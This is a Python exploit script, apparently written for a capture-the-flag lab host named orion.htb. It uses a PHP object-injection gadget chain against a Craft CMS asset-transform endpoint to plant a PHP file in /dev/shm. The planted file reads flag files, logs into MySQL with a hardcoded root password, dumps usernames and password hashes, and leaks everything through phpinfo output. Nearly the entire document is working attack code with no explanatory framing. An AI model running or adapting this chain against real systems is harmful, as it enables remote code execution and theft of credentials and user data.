import requests, re, base64, time

HOST = 'http://orion.htb'

# Step 1: Write env setter PHP file to /dev/shm/
php_setter = (
    '<?php '
    '$uf = @file_get_contents("/home/adam/user.txt"); '
    '$rf = @file_get_contents("/root/root.txt"); '
    '$_ENV["UF"] = $uf !== false ? trim($uf) : "NO_UF"; '
    '$_ENV["RF"] = $rf !== false ? trim($rf) : "NO_RF"; '
    'try { '
    '  $db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); '
    '  $us = $db->query("SELECT id,username,email,password,admin FROM users")->fetchAll(PDO::FETCH_ASSOC); '
    '  $_ENV["USERS"] = json_encode($us); '
    '} catch (Exception $e) { $_ENV["DBERR"] = $e->getMessage(); } '
    '?>'
)

# Step 1: Write the env_setter.php
print("[*] Step 1: Writing env setter ...")
b64 = base64.b64encode(php_setter.encode()).decode()
write_php = '<?php file_put_contents("/dev/shm/env_setter.php", base64_decode("' + b64 + '")); ?>'

s = requests.Session()
s.get(f'{HOST}/index.php?p=admin/dashboard')
r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
tok = m.group(1) if m else ''
body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":' + '"php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + base64.b64encode(write_php.encode()).decode() + '"}]}}}
headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
r = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=30)
print(f"    Status: {r.status_code}")
time.sleep(2)

# Step 2: Try passing array of handles to combine PhpManager + FnStream
print("[*] Step 2: Trying combined payload ...")
s2 = requests.Session()
s2.get(f'{HOST}/index.php?p=admin/dashboard')
r3 = s2.get(f'{HOST}/index.php?p=admin/dashboard')
m2 = re.search(r'csrfTokenValue":"([^"]+)"', r3.text)
tok2 = m2.group(1) if m2 else ''

# Try array format for handle
body2 = {"assetId":11,"handle":[
    {"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/dev/shm/env_setter.php"}]}},
    {"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"GuzzleHttp\\Psr7\\FnStream","__construct()":[[]],"_fn_close":"phpinfo"}}
]}
headers2 = {'Content-Type':'application/json','X-CSRF-Token':tok2}
r4 = s2.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body2, headers=headers2, timeout=60)

print(f"    Status: {r4.status_code}, Len: {len(r4.text)}")
t = r4.text

if 'PHP Version' in t:
    print('[+] PHPINFO FOUND!')
    # Look for our env vars
    for kw in ["['UF']", "['RF']", "['USERS']", "['DBERR']", "NO_UF"]:
        if kw in t:
            idx = t.index(kw)
            print(f'[+] "{kw}" at byte {idx}')
            start = max(0, idx - 80)
            end = min(len(t), idx + 250)
            context = t[start:end]
            context_clean = context.replace('&gt;', '>').replace('&lt;', '<')
            print(f'    Context: {context_clean}')
    print()
    # Show the PHP Variables section especially
    if 'PHP Variables' in t:
        pv = t[t.index('PHP Variables'):]
        print(f'PHP Variables section:')
        print(pv[:600])
    # Show the $_ENV section
    if '$_ENV' in t:
        env_section = t[t.index('$_ENV'):]
        print(f'\n$_ENV section:')
        print(env_section[:2000])
else:
    print('[-] phpinfo NOT found')
    print(f'First 500: {t[:500]}')
    print(f'Last 500: {t[-500:]}')
